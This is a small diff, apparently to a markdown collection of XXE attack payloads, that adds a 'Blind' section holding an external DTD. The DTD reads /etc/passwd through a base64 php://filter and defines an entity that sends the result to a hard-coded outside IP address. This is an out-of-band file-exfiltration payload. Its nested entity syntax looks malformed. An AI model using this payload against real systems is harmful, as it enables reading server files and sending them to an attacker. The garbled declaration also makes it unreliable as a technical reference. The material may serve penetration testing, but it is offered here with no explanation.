@@ -64,3 +64,11 @@ evil.dtd
 </urlset>
 ```
 
+# Blind
+
+```dtd
+<!ENTITY data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"> 
+<!ENTITY paran1 <!ENTITY exfil SYSTEM "http://206.189.166.24/?x=data; ">">
+```
+
+
